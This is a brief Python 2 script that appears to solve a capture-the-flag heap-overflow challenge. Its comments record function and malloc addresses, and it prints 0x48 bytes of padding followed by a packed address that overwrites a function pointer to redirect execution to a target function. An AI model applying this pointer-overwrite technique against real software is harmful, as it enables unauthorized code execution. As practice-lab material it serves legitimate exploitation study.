import struct

# functions main, m, n
# n is the right function
# 0x08048454

# Function "m" just prints "Nope!"

# first malloc = 0x804a008
# second malloc = 0x804a050
# diff == 0x48
padd = 'a' * 0x48
m = struct.pack("<I", 0x08048454)
print padd + m
